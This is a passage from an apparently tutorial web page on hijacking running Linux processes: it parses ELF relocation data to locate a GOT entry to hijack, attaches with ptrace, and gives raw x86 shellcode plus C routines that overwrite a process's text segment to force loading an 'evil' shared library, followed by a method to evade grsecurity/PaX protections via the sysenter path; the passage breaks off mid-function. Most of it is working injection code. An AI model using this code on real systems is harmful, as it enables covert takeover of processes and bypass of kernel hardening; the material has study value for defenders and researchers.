&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; strncpy<span style="color: black;">(</span>link<span style="color: black;">[</span>j<span style="color: black;">]</span>.<span style="color: #202020;">name</span>, &amp;symbol<span style="color: black;">[</span>symsp-&gt;st_name<span style="color: black;">]</span>, <span style="color: #993333;">sizeof</span><span style="color: black;">(</span>link<span style="color: black;">[</span>j<span style="color: black;">]</span>.<span style="color: #202020;">name</span><span style="color: black;">)</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!link<span style="color: black;">[</span>j<span style="color: black;">]</span>.<span style="color: #202020;">name</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> fatal;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; link<span style="color: black;">[</span>j<span style="color: black;">]</span>.<span style="color: #202020;">index</span> = j;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = ehdr-&gt;e_shnum; i-- &gt; <span style="color: #cc66cc;">0</span>; shdr++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">switch</span><span style="color: black;">(</span>shdr-&gt;sh_type<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> SHT_REL:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;rel = <span style="color: black;">(</span>Elf32_Rel *<span style="color: black;">)</span><span style="color: black;">(</span>mem + shdr-&gt;sh_offset<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">(</span>j = <span style="color: #cc66cc;">0</span>; j &lt; shdr-&gt;sh_size; j += <span style="color: #993333;">sizeof</span><span style="color: black;">(</span>Elf32_Rel<span style="color: black;">)</span>, rel++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>k = <span style="color: #cc66cc;">0</span>; k &lt; symcount; k++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ELF32_R_SYM<span style="color: black;">(</span>rel-&gt;r_info<span style="color: black;">)</span> == link<span style="color: black;">[</span>k<span style="color: black;">]</span>.<span style="color: #202020;">index</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; link<span style="color: black;">[</span>k<span style="color: black;">]</span>.<span style="color: #202020;">offset</span> = rel-&gt;r_offset;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> SHT_RELA:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">default</span>:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> link;<br>
&nbsp; &nbsp; &nbsp; &nbsp; fatal:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #000000; font-weight: bold;">NULL</span>;<br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>To call the function we could do:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"> &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>lp = <span style="color: black;">(</span><span style="color: #993333;">struct</span> linking_info *<span style="color: black;">)</span>get_plt<span style="color: black;">(</span>mem<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"get_plt() failed<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">goto</span> done;<br>
&nbsp; <span style="color: black;">}</span><br>
&nbsp;</div>
<p>'struct lp' will provide us with the relevant PLT info to read/write the GOT entry that represents our desired symbol to hijack.</p>
<p><strong>Step 3</strong></p>
<p>At this point we are more than ready to attach to the process, this can be done using the PTRACE_ATTACH request:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ptrace<span style="color: black;">(</span>PTRACE_ATTACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Failed to attach to process<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
<span style="color: black;">}</span><br>
waitpid<span style="color: black;">(</span>pid, &amp;status, WUNTRACED<span style="color: black;">)</span>;<br>
&nbsp;</div>
<p><strong>Step 4-8 (non grsec method)</strong></p>
<p>We need to force the target process to load our evil .so (shared 
object); in order to do so we will need to inject our loader shellcode 
into the process image somewhere. Some people might use the stack for 
this purpose, but since some systems have a non- executable stack, it 
would be wise to use the text segment. For this we can simply start at 
the base 8048000 and overwrite the first 90 bytes with our shellcode. We
 must make sure to save the original code so we can replace it when we 
are done.</p>
<p>Here is our shellcode:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">char</span> mmap_shellcode<span style="color: black;">[</span><span style="color: black;">]</span> =<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>e9<span style="color: #000099; font-weight: bold;">\x</span>3b<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>31<span style="color: #000099; font-weight: bold;">\x</span>c9<span style="color: #000099; font-weight: bold;">\x</span>b0<span style="color: #000099; font-weight: bold;">\x</span>05<span style="color: #000099; font-weight: bold;">\x</span>5b<span style="color: #000099; font-weight: bold;">\x</span>31<span style="color: #000099; font-weight: bold;">\x</span>c9<span style="color: #000099; font-weight: bold;">\x</span>cd<span style="color: #000099; font-weight: bold;">\x</span>80<span style="color: #000099; font-weight: bold;">\x</span>83<span style="color: #000099; font-weight: bold;">\x</span>ec"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>18<span style="color: #000099; font-weight: bold;">\x</span>31<span style="color: #000099; font-weight: bold;">\x</span>d2<span style="color: #000099; font-weight: bold;">\x</span>89<span style="color: #000099; font-weight: bold;">\x</span>14<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>c7<span style="color: #000099; font-weight: bold;">\x</span>44<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>04<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>20<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>c7<span style="color: #000099; font-weight: bold;">\x</span>44"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>08<span style="color: #000099; font-weight: bold;">\x</span>07<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>c7<span style="color: #000099; font-weight: bold;">\x</span>44<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>0c<span style="color: #000099; font-weight: bold;">\x</span>02<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>89<span style="color: #000099; font-weight: bold;">\x</span>44"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>10<span style="color: #000099; font-weight: bold;">\x</span>89<span style="color: #000099; font-weight: bold;">\x</span>54<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>14<span style="color: #000099; font-weight: bold;">\x</span>b8<span style="color: #000099; font-weight: bold;">\x</span>5a<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>89<span style="color: #000099; font-weight: bold;">\x</span>e3<span style="color: #000099; font-weight: bold;">\x</span>cd<span style="color: #000099; font-weight: bold;">\x</span>80<span style="color: #000099; font-weight: bold;">\x</span>cc"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>e8<span style="color: #000099; font-weight: bold;">\x</span>c0<span style="color: #000099; font-weight: bold;">\x</span>ff<span style="color: #000099; font-weight: bold;">\x</span>ff<span style="color: #000099; font-weight: bold;">\x</span>ff<span style="color: #000099; font-weight: bold;">\x</span>6c<span style="color: #000099; font-weight: bold;">\x</span>69<span style="color: #000099; font-weight: bold;">\x</span>62<span style="color: #000099; font-weight: bold;">\x</span>74<span style="color: #000099; font-weight: bold;">\x</span>65<span style="color: #000099; font-weight: bold;">\x</span>73<span style="color: #000099; font-weight: bold;">\x</span>74<span style="color: #000099; font-weight: bold;">\x</span>2e<span style="color: #000099; font-weight: bold;">\x</span>73<span style="color: #000099; font-weight: bold;">\x</span>6f<span style="color: #000099; font-weight: bold;">\x</span>2e"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>31<span style="color: #000099; font-weight: bold;">\x</span>2e<span style="color: #000099; font-weight: bold;">\x</span>30<span style="color: #000099; font-weight: bold;">\x</span>00"</span>;<br>
&nbsp;</div>
<p>Our hijacker will use the following function to force the target process into loading our shared object.</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">int</span> mmap_library<span style="color: black;">(</span><span style="color: #993333;">int</span> pid<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> &nbsp;user_regs_struct reg;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">long</span> eip, esp, <span style="color: #993333;">string</span>, offset, str,<br>
&nbsp; &nbsp; &nbsp; &nbsp; eax, ebx, ecx, edx;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> i, j = <span style="color: #cc66cc;">0</span>, ret, status;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> buf<span style="color: black;">[</span><span style="color: #cc66cc;">30</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> saved_text<span style="color: black;">[</span><span style="color: #cc66cc;">94</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *p;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* save register state */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; eip = reg.<span style="color: #202020;">eip</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; esp = reg.<span style="color: #202020;">esp</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; eax = reg.<span style="color: #202020;">eax</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ebx = reg.<span style="color: #202020;">ebx</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ecx = reg.<span style="color: #202020;">ecx</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; edx = reg.<span style="color: #202020;">edx</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; offset = text_base; <span style="color: black; font-style: italic;">// probably 8048000</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"%%eip -&gt; 0x%x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, eip<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Injecting mmap_shellcode at 0x%x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, offset<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* were going to load our shellcode at current eip */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* first we must backup the original code into saved_text */</span><br>
&nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">90</span>; i += <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; buf<span style="color: black;">[</span>j++<span style="color: black;">]</span> = ptrace<span style="color: black;">(</span>PTRACE_PEEKTEXT, pid, <span style="color: black;">(</span>offset + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; p = <span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *<span style="color: black;">)</span>buf;<br>
&nbsp; &nbsp; &nbsp; &nbsp; memcpy<span style="color: black;">(</span>saved_text, p, <span style="color: #cc66cc;">90</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* load shellcode into text starting at base */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">90</span>; i += <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, <span style="color: black;">(</span>offset + i<span style="color: black;">)</span>, *<span style="color: black;">(</span><span style="color: #993333;">long</span> *<span style="color: black;">)</span><span style="color: black;">(</span>mmap_shellcode + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>Setting %%eip to 0x%x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, offset<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = offset + <span style="color: #cc66cc;">2</span>; &nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_CONT, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* check where eip is now at */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"%%eip is now at 0x%x, resetting it to 0x%x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, reg.<span style="color: #202020;">eip</span>, eip<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"inserting original code back<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>j = <span style="color: #cc66cc;">0</span>, i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">90</span>; i += <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; buf<span style="color: black;">[</span>j++<span style="color: black;">]</span> = ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, <span style="color: black;">(</span>offset + i<span style="color: black;">)</span>, *<span style="color: black;">(</span><span style="color: #993333;">long</span> *<span style="color: black;">)</span><span style="color: black;">(</span>saved_text + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* reset register state */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = eip;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eax</span> = eax;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ebx</span> = ebx;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ecx</span> = ecx;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">edx</span> = edx;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">esp</span> = esp;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* detach -- when we re-attach we will have access */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* to our shared library */</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ptrace<span style="color: black;">(</span>PTRACE_DETACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">-1</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"ptrace_detach"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p><strong>Step 4-8 (grsec method)</strong></p>
<p>NOTE: This method works assuming that the grsec feature that disallows ptrace is not enabled.</p>
<p>As previously stated, grsec patched kernels will not allow us to 
write to a mapped region with ptrace if it is not writable, thus 
injecting shellcode that tells us to load our shared object is hopeless.
 We are instead going to use the method that I described in the chapter 
on loading the parasite, which is to not inject any code at all, but 
instead hijack an existing system call entrance and utilize it to 
execute our own syscalls prior to executing the real ones, this allows 
us to sneak our shared object into the process without needing to inject
 shellcode. We want to locate the address of sysenter dynamically 
(without using the /proc/&lt;pid&gt;/map file), to do this we will need 
to use PTRACE_SYSCALL. In alot of kernels linux-gate is not randomized, 
but obtaining the address to sysenter, which is within the linux-gate 
must be done dynamically because its loaded randomly for each process in
 grsec kernels. Once we know where sysenter is, we start 5 bytes above 
it; if you start directly on sysenter, this method doesn't seem to work 
on some systems. We load %eax with the SYS_open number, store our 
library string in the data segment etc. We then single step through the 
instructions for 5 steps, this will get us through the sysenter, and by 
the end %eax will be holding the return address, which is the fd for 
mmap(). We do the same thing for mmap(), but we store all of its args in
 the data segment right after our library string, and store the address 
to them in %ebx. One other significant change we are making is mapping 
the text segment and data segment individually, and sticking to their 
binary flags. i.e mapping the entire file into memory is not going to 
work properly because the text segment can't have write permissions and 
the data segment can't have execute permissions, this is an mprotect() 
restriction through PaX.</p>
<p>Lets take a look at our code:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">int</span> grsec_mmap_library<span style="color: black;">(</span><span style="color: #993333;">int</span> pid<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> &nbsp;user_regs_struct reg;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">long</span> eip, esp, <span style="color: #993333;">string</span>, offset, str,<br>
&nbsp; &nbsp; &nbsp; &nbsp; eax, ebx, ecx, edx, orig_eax, data;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> syscall;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> i, j = <span style="color: #cc66cc;">0</span>, ret, status, fd;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> library_string<span style="color: black;">[</span>MAXBUF<span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> orig_ds<span style="color: black;">[</span>MAXBUF<span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> buf<span style="color: black;">[</span>MAXBUF<span style="color: black;">]</span> = <span style="color: black;">{</span><span style="color: #cc66cc;">0</span><span style="color: black;">}</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> tmp<span style="color: black;">[</span><span style="color: #cc66cc;">8192</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> open_done = <span style="color: #cc66cc;">0</span>, mmap_done = <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> int80 = <span style="color: #cc66cc;">0</span>;<br>
